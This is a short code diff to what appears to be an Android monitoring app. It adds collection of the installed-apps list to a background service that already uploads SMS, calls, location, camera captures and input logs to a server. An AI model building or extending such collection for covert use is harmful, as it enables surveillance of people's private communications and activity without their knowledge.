@@ -15,6 +15,7 @@ import com.takip.app.api.ApiClient
 import com.takip.app.collector.AppUsageCollector
 import com.takip.app.collector.CallCollector
 import com.takip.app.collector.CameraCaptureHelper
+import com.takip.app.collector.InstalledAppsCollector
 import com.takip.app.collector.LocationCollector
 import com.takip.app.collector.SmsCollector
 import com.takip.app.util.PermissionChecker
@@ -115,6 +116,8 @@ class MonitoringService : Service() {
         if (uploadArray(inputLogs) { ApiClient.uploadInputLogs(token, it) }) {
             ActivityLogQueue.clearInputLogs()
         }
+
+        uploadArray(InstalledAppsCollector.collect(this)) { ApiClient.uploadInstalledApps(token, it) }
 
         captureAndUploadMedia(token)
     }
